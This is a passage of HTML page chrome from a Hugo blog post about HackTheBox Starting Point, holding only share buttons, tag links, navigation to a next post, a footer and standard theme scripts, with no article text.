                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://pasqnix.github.io/startingpoint/" data-title="Starting Point on HackTheBox (2020)" data-via="xxxx" data-hashtags="reverse engineering,ida pro,hackthebox,assembly"><i class="fab fa-twitter fa-fw"></i>&nbsp;</a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://pasqnix.github.io/startingpoint/" data-hashtag="reverse engineering"><i class="fab fa-facebook-square fa-fw"></i>&nbsp;</a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://pasqnix.github.io/startingpoint/" data-title="Starting Point on HackTheBox (2020)"><i class="fab fa-hacker-news fa-fw"></i>&nbsp;</a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://pasqnix.github.io/startingpoint/" data-title="Starting Point on HackTheBox (2020)"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://pasqnix.github.io/startingpoint/" data-title="Starting Point on HackTheBox (2020)"><i class="fab fa-weibo fa-fw"></i>&nbsp;</a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a>,&nbsp;<a href="/tags/ida-pro/">Ida Pro</a>,&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/assembly/">Assembly</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/practicalbinaryanalysis_intro/" class="next" rel="next" title="[Practical Binary Analysis] Introduction">[Practical Binary Analysis] Introduction<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>


        <div style="height: 80px;position:absolute;">&nbsp;</div>
    </article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
